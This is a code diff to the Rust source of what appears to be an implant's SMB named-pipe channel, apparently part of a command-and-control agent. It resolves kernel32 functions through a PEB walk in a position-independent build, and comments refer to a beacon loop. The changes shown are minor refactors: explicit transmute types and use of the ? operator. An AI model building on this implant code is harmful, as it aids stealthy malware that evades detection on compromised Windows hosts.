@@ -49,7 +49,7 @@
 //!   wedged peer costs at most one cycle), and the beacon loop's own cadence
 //!   bounds total impact. Fully-bounded I/O would require OVERLAPPED
 //!   + `WaitForSingleObject` with a deadline, which is deliberately out of
-//!   scope for this PIC build (no handle RAII under the bump allocator).
+//!     scope for this PIC build (no handle RAII under the bump allocator).
 
 #![cfg(target_os = "windows")]
 
@@ -158,12 +158,12 @@ unsafe fn ensure_k32() -> bool {
         // matching `extern "system"` signature is sound because the Win32 ABI
         // is exactly that signature. Mirrors transport.rs's WinHTTP resolution.
         let fns = alloc::boxed::Box::new(K32Fns {
-            create_file_w: core::mem::transmute(cf),
-            write_file: core::mem::transmute(wf),
-            read_file: core::mem::transmute(rf),
-            close_handle: core::mem::transmute(ch),
-            wait_named_pipe_w: core::mem::transmute(wnpw),
-            get_last_error: core::mem::transmute(gle),
+            create_file_w: core::mem::transmute::<usize, FCreateFileW>(cf),
+            write_file: core::mem::transmute::<usize, FWriteFile>(wf),
+            read_file: core::mem::transmute::<usize, FReadFile>(rf),
+            close_handle: core::mem::transmute::<usize, FCloseHandle>(ch),
+            wait_named_pipe_w: core::mem::transmute::<usize, FWaitNamedPipeW>(wnpw),
+            get_last_error: core::mem::transmute::<usize, FGetLastError>(gle),
         });
         let ptr = alloc::boxed::Box::into_raw(fns) as usize;
         match K32.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
@@ -203,14 +203,8 @@ fn to_utf16(s: &[u8]) -> Vec<u16> {
 /// Resolves and invokes kernel32 function pointers via PEB walk; all pointer
 /// arguments point into the implant's own stack/heap buffers.
 pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
-    let fns = match send_recv_preflight(ctx) {
-        Some(f) => f,
-        None => return None,
-    };
-    let handle = match send_recv_open_pipe(fns, ctx.smb_pipe_name.as_bytes()) {
-        Some(h) => h,
-        None => return None,
-    };
+    let fns = send_recv_preflight(ctx)?;
+    let handle = send_recv_open_pipe(fns, ctx.smb_pipe_name.as_bytes())?;
 
     // Guard: ensure the handle is closed on every return path below. We inline
     // the close before each `return` because the bump allocator has no Drop and
